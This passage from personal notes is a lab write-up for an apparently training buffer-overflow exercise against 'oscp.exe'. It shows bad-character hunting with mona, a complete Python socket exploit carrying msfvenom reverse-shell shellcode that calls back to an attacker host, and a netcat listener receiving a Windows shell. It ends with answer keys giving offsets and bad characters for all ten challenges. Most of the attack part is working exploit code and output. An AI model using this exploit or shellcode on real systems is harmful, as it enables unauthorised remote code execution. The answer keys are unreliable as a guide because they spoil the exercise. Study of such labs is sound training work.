@@ -449,3 +449,454 @@ try:
   print("Done!")
 except:
   print("Could not connect.")
+
+Restart the .exe in Immunity Debugger with Ctrl+F2 and F9 to run. Execute the exploit.py. If the offset is correct we should see “42424242” <- the B’s at the EIP.
+
+Let’s run it again.
+
+As we can see the EIP Register is Overwritten with BBBB or 42424242. So far everything went well.
+
+Take note of the ESP address because we will be using the values in this position in future step
+
+Find Badchars
+
+Now we need to find the BADCHARS- For which we create BADCHARS, on set inside the machine using MONA and another by just googling or using a python script.By default \x00 is considered as a BADCHAR so it is to be neglected for sure. This helps us to identify the characters which are really BAD for our program!
+
+Generate a bytearray using mona, and exclude the null byte (\x00) by default.
+
+Use this mona commands.
+
+Now we need to generate a string of bad chars from \x01 to \xff that is identical to the bytearray. Use the python script
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow]
+└─$ nano bytegen.py
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow]
+└─$ cat bytegen.py 
+for x in range(1, 256):
+  print("\\x" + "{:02x}".format(x), end='')
+print()
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow]
+└─$ python3 bytegen.py 
+\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
+
+This generated string has already removed the \x00 so we need to remove that from the .bin with mona.
+
+Copy the new generated string into the payload variable in the exploit.py
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow]
+└─$ nano exploit.py
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow]
+└─$ cat exploit.py
+import socket
+
+ip = "10.10.180.27"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 1978
+overflow = "A" * offset
+retn = "BBBB"
+padding = ""
+payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+
+Run the script and take note of the address to which the ESP register points
+
+Right click on ESP Value and Follow in dump
+
+06 0A 0D
+
+the sequence has been changed after 06 that means there are some badchar in over payload lets find out badchars
+
+Use it in the following mona command
+
+Note:- Maybe your ESP address is different
+
+!mona compare -f C:\mona\oscp\bytearray.bin -a 0193FA30
+
+Possible bad chars
+
+So we found a list of possible bad chars 07 08 2e 2f a0 a1
+
+Not all of these might be bad chars! Sometimes bad chars cause the next byte to get corrupted as well, or even affect the rest of the string.
+
+yep it's not the ans \x00\x07\x08\x2e\x2f\xa0\xa1 😢 
+
+Remember that badchars can affect the next byte as well!
+
+At this point I start removing the bad characters one at a time. I removed one bad character at a time by repeating the following steps:
+
+    Remove character from byte array
+    Remove character from exploit payload
+    Start exe
+    Compare using mona
+
+Start oscp.exe in immunity,
+
+So i created a new bytearray and removed \x07 from the payload too
+
+!mona bytearray -b "\x00\x07"
+
+run server
+
+Edit exploit.py remove \x07 from payload variable and run exploit.py
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow]
+└─$ cat exploit.py
+import socket
+
+ip = "10.10.180.27"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 1978
+overflow = "A" * offset
+retn = "BBBB"
+padding = ""
+payload = "\x01\x02\x03\x04\x05\x06\x08\ 
+
+...
+
+check ESP Pointer value
+
+0186FA30
+
+!mona compare -f C:\mona\oscp\bytearray.bin -a 0186FA30
+
+As a hint by the immunity debugger the possible BADCHARS now were x2e \x2f \xa0 \xa1. That means a BADCHAR made its adjacent byte too a BADCHAR which want BAD by default
+
+start oscp.exe in immunity
+
+So i created a new bytearray and removed \x2e from the payload too
+
+!mona bytearray -b "\x00\x07\x2e"
+
+run server
+
+Edit exploit.py remove \x2e from payload variable and run exploit.py
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow]
+└─$ cat exploit.py
+import socket
+
+ip = "10.10.180.27"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 1978
+overflow = "A" * offset
+retn = "BBBB"
+padding = ""
+payload = "\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow]
+└─$ python3  exploit.py
+Sending evil buffer...
+Done!
+
+ESP= 0183FA30
+
+check ESP with mona in immunity debuger
+
+!mona compare -f C:\mona\oscp\bytearray.bin -a 0183FA30
+
+and again it was the same case x2e was a BADCHAR was x2f wasn’t one.
+
+Now we had only two apparent BADCHARS \xa0 \xa1
+
+start oscp.exe in immunity
+
+So i created a new bytearray and removed \xa0 from the payload too
+
+!mona bytearray -b “\x00\x07\x2e\xa0”
+
+again 
+
+──(kali㉿kali)-[~/bufferoverflow]
+└─$ cat exploit.py 
+import socket
+
+ip = "10.10.180.27"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 1978
+overflow = "A" * offset
+retn = "BBBB"
+padding = ""
+payload = "\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa1\
+
+check ESP : 01BFFA30
+
+!mona compare -f C:\mona\oscp\bytearray.bin -a 01BFFA30
+
+After this! WE FIRE IT and run the comparison in MONA, we find the address unmodified now. BOOM so finally we got our BADCHARS
+
+got error unmodified
+
+And after try and error, the sequence is like this.
+
+so
+
+\x00\x07\x2e\xa0
+```
+![[Pasted image 20220929120146.png]]
+![](https://miro.medium.com/max/720/1*_DhBynwGyWlCRB8orZYbiQ.png)
+![[Pasted image 20220929115916.png]]
+![[Pasted image 20220929120319.png]]
+![](https://miro.medium.com/max/720/1*v2hBWypZ7Xtpd8pvpvPhgQ.png)
+![[Pasted image 20220929121620.png]]
+![](https://miro.medium.com/max/720/1*WZXoC1tBXkJPJ7HVaxS42Q.png)
+![[Pasted image 20220929121913.png]]
+![[Pasted image 20220929123218.png]]
+![[Pasted image 20220929123908.png]]
+![[Pasted image 20220929124809.png]]
+![[Pasted image 20220929125343.png]]
+![[Pasted image 20220929125603.png]]
+![[Pasted image 20220929125807.png]]
+![[Pasted image 20220929145846.png]]
+![[Pasted image 20220929150033.png]]
+![[Pasted image 20220929150748.png]]
+![[Pasted image 20220929150924.png]]
+![[Pasted image 20220929151050.png]]
+What is the EIP offset for OVERFLOW1?
+*1978*
+In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW1?
+Remember that badchars can affect the next byte as well!
+*\x00\x07\x2e\xa0*
+```text
+Let’s find the jump point using the mona command again:
+
+!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
+
+Any of the addresses from the results above may be used as the retn value in the exploit. Little endian = Reverse. Also add padding to allow the payload to unpack.
+
+Note the address 625011AF
+
+Update our retn variable with the new address and must be written backward (since the system is little-endian=Reverse).
+
+retn = "\xaf\x11\x50\x62"
+padding = "\x90" * 16
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow]
+└─$ cat exploit.py
+import socket
+
+ip = "10.10.180.27"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 1978
+overflow = "A" * offset
+retn = "\xaf\x11\x50\x62"
+padding = "\x90" * 16
+payload = "\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\
+...
+
+Now generate the reverse shell payload using msfvenom.
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of c file: 1506 bytes
+unsigned char buf[] = 
+"\xda\xd0\xb8\x6c\xd4\x6d\x95\xd9\x74\x24\xf4\x5d\x33\xc9"
+"\xb1\x52\x31\x45\x17\x83\xc5\x04\x03\x29\xc7\x8f\x60\x4d"
+"\x0f\xcd\x8b\xad\xd0\xb2\x02\x48\xe1\xf2\x71\x19\x52\xc3"
+"\xf2\x4f\x5f\xa8\x57\x7b\xd4\xdc\x7f\x8c\x5d\x6a\xa6\xa3"
+"\x5e\xc7\x9a\xa2\xdc\x1a\xcf\x04\xdc\xd4\x02\x45\x19\x08"
+"\xee\x17\xf2\x46\x5d\x87\x77\x12\x5e\x2c\xcb\xb2\xe6\xd1"
+"\x9c\xb5\xc7\x44\x96\xef\xc7\x67\x7b\x84\x41\x7f\x98\xa1"
+"\x18\xf4\x6a\x5d\x9b\xdc\xa2\x9e\x30\x21\x0b\x6d\x48\x66"
+"\xac\x8e\x3f\x9e\xce\x33\x38\x65\xac\xef\xcd\x7d\x16\x7b"
+"\x75\x59\xa6\xa8\xe0\x2a\xa4\x05\x66\x74\xa9\x98\xab\x0f"
+"\xd5\x11\x4a\xdf\x5f\x61\x69\xfb\x04\x31\x10\x5a\xe1\x94"
+"\x2d\xbc\x4a\x48\x88\xb7\x67\x9d\xa1\x9a\xef\x52\x88\x24"
+"\xf0\xfc\x9b\x57\xc2\xa3\x37\xff\x6e\x2b\x9e\xf8\x91\x06"
+"\x66\x96\x6f\xa9\x97\xbf\xab\xfd\xc7\xd7\x1a\x7e\x8c\x27"
+"\xa2\xab\x03\x77\x0c\x04\xe4\x27\xec\xf4\x8c\x2d\xe3\x2b"
+"\xac\x4e\x29\x44\x47\xb5\xba\x61\x93\xe4\xe6\x1e\xa1\x06"
+"\x06\x83\x2c\xe0\x42\x2b\x79\xbb\xfa\xd2\x20\x37\x9a\x1b"
+"\xff\x32\x9c\x90\x0c\xc3\x53\x51\x78\xd7\x04\x91\x37\x85"
+"\x83\xae\xed\xa1\x48\x3c\x6a\x31\x06\x5d\x25\x66\x4f\x93"
+"\x3c\xe2\x7d\x8a\x96\x10\x7c\x4a\xd0\x90\x5b\xaf\xdf\x19"
+"\x29\x8b\xfb\x09\xf7\x14\x40\x7d\xa7\x42\x1e\x2b\x01\x3d"
+"\xd0\x85\xdb\x92\xba\x41\x9d\xd8\x7c\x17\xa2\x34\x0b\xf7"
+"\x13\xe1\x4a\x08\x9b\x65\x5b\x71\xc1\x15\xa4\xa8\x41\x35"
+"\x47\x78\xbc\xde\xde\xe9\x7d\x83\xe0\xc4\x42\xba\x62\xec"
+"\x3a\x39\x7a\x85\x3f\x05\x3c\x76\x32\x16\xa9\x78\xe1\x17"
+"\xf8";
+
+final exploit to get revshell
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow]
+└─$ cat exploit.py
+import socket
+
+ip = "10.10.180.27"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 1978
+overflow = "A" * offset
+retn = "\xaf\x11\x50\x62"
+padding = "\x90" * 16
+payload = ("\xda\xd0\xb8\x6c\xd4\x6d\x95\xd9\x74\x24\xf4\x5d\x33\xc9"
+"\xb1\x52\x31\x45\x17\x83\xc5\x04\x03\x29\xc7\x8f\x60\x4d"
+"\x0f\xcd\x8b\xad\xd0\xb2\x02\x48\xe1\xf2\x71\x19\x52\xc3"
+"\xf2\x4f\x5f\xa8\x57\x7b\xd4\xdc\x7f\x8c\x5d\x6a\xa6\xa3"
+"\x5e\xc7\x9a\xa2\xdc\x1a\xcf\x04\xdc\xd4\x02\x45\x19\x08"
+"\xee\x17\xf2\x46\x5d\x87\x77\x12\x5e\x2c\xcb\xb2\xe6\xd1"
+"\x9c\xb5\xc7\x44\x96\xef\xc7\x67\x7b\x84\x41\x7f\x98\xa1"
+"\x18\xf4\x6a\x5d\x9b\xdc\xa2\x9e\x30\x21\x0b\x6d\x48\x66"
+"\xac\x8e\x3f\x9e\xce\x33\x38\x65\xac\xef\xcd\x7d\x16\x7b"
+"\x75\x59\xa6\xa8\xe0\x2a\xa4\x05\x66\x74\xa9\x98\xab\x0f"
+"\xd5\x11\x4a\xdf\x5f\x61\x69\xfb\x04\x31\x10\x5a\xe1\x94"
+"\x2d\xbc\x4a\x48\x88\xb7\x67\x9d\xa1\x9a\xef\x52\x88\x24"
+"\xf0\xfc\x9b\x57\xc2\xa3\x37\xff\x6e\x2b\x9e\xf8\x91\x06"
+"\x66\x96\x6f\xa9\x97\xbf\xab\xfd\xc7\xd7\x1a\x7e\x8c\x27"
+"\xa2\xab\x03\x77\x0c\x04\xe4\x27\xec\xf4\x8c\x2d\xe3\x2b"
+"\xac\x4e\x29\x44\x47\xb5\xba\x61\x93\xe4\xe6\x1e\xa1\x06"
+"\x06\x83\x2c\xe0\x42\x2b\x79\xbb\xfa\xd2\x20\x37\x9a\x1b"
+"\xff\x32\x9c\x90\x0c\xc3\x53\x51\x78\xd7\x04\x91\x37\x85"
+"\x83\xae\xed\xa1\x48\x3c\x6a\x31\x06\x5d\x25\x66\x4f\x93"
+"\x3c\xe2\x7d\x8a\x96\x10\x7c\x4a\xd0\x90\x5b\xaf\xdf\x19"
+"\x29\x8b\xfb\x09\xf7\x14\x40\x7d\xa7\x42\x1e\x2b\x01\x3d"
+"\xd0\x85\xdb\x92\xba\x41\x9d\xd8\x7c\x17\xa2\x34\x0b\xf7"
+"\x13\xe1\x4a\x08\x9b\x65\x5b\x71\xc1\x15\xa4\xa8\x41\x35"
+"\x47\x78\xbc\xde\xde\xe9\x7d\x83\xe0\xc4\x42\xba\x62\xec"
+"\x3a\x39\x7a\x85\x3f\x05\x3c\x76\x32\x16\xa9\x78\xe1\x17"
+"\xf8")
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow]
+└─$ python3  exploit.py
+Sending evil buffer...
+Done!
+
+execute oscp in immunity debugger then
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ nc -lvp 4444                
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.180.27.
+Ncat: Connection from 10.10.180.27:49304.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\admin\Desktop\vulnerable-apps\oscp>whoami
+whoami
+oscp-bof-prep\admin
+
+C:\Users\admin\Desktop\vulnerable-apps\oscp>
+
+the same for the rest of bufferoverflow just change the name OVERFLOW2, then 3 till 10
+```
+![[Pasted image 20220929151545.png]]
+![[Pasted image 20220929153037.png]]
+### oscp.exe - OVERFLOW2
+Repeat the steps outlined in Task 2 but for the OVERFLOW2 command.
+What is the EIP offset for OVERFLOW2?
+*634*
+In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW2?
+*\x00\x23\x3c\x83\xba*
+### oscp.exe - OVERFLOW3
+Repeat the steps outlined in Task 2 but for the OVERFLOW3 command.
+What is the EIP offset for OVERFLOW3?
+*1274*
+In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW3?
+*\x00\x11\x40\x5f\xb8\xee*
+### oscp.exe - OVERFLOW4
+Repeat the steps outlined in Task 2 but for the OVERFLOW4 command.
+What is the EIP offset for OVERFLOW4?
+*2026*
+In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW4?
+*\x00\xa9\xcd\xd4*
+### oscp.exe - OVERFLOW5
+Repeat the steps outlined in Task 2 but for the OVERFLOW5 command.
+What is the EIP offset for OVERFLOW5?
+*314*
+In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW5?
+*\x00\x16\x2f\xf4\xfd*
+### oscp.exe - OVERFLOW6
+Repeat the steps outlined in Task 2 but for the OVERFLOW6 command.
+What is the EIP offset for OVERFLOW6?
+*1034*
+In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW6?
+*\x00\x08\x2c\xad*
+### oscp.exe - OVERFLOW7
+Repeat the steps outlined in Task 2 but for the OVERFLOW7 command.
+What is the EIP offset for OVERFLOW7?
+*1306*
+In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW7?
+*\x00\x8c\xae\xbe\xfb*
+### oscp.exe - OVERFLOW8
+Repeat the steps outlined in Task 2 but for the OVERFLOW8 command.
+What is the EIP offset for OVERFLOW8?
+*1786*
+In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW8?
+*\x00\x1d\x2e\xc7\xee*
+### oscp.exe - OVERFLOW9
+Repeat the steps outlined in Task 2 but for the OVERFLOW9 command.
+What is the EIP offset for OVERFLOW9?
+*1514*
+In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW9?
+*\x00\x04\x3e\x3f\xe1*
+### oscp.exe - OVERFLOW10
+Repeat the steps outlined in Task 2 but for the OVERFLOW10 command.
+What is the EIP offset for OVERFLOW10?
+*537*
+In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW10?
+*\x00\xa0\xad\xbe\xde\xef*
+
+## Notes / Lessons Learned
+[[Hacking with PowerShell]]
+
